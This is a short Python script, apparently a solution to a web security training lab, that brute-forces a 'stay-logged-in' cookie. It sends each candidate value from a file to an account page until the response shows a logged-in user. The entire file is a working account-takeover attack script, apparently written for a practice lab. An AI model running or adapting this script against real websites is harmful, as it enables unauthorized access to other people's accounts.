# Created by sm6r,2024
# Lab: Brute-forcing a stay-logged-in cookie
import requests
import sys

if len(sys.argv)!=2:
    print("Usage: solution.py MYACCOUNT_PAGE_URL")
    exit()

url = sys.argv[1]
cookies= open("cookies.txt","r").readlines()
flg=True

for cookie in cookies:
    response= requests.get(url,cookies={'stay-logged-in':cookie.strip()})
    print(f"Username: Carlos    Cookie: {cookie.strip()}",end="\r")
    
    if response.text.find("Your username is:")!= -1:
        print("\nYour are logged in ....")
        flg=False

    if not flg:
        break


if flg:
    print("\nATTACK FAILED")

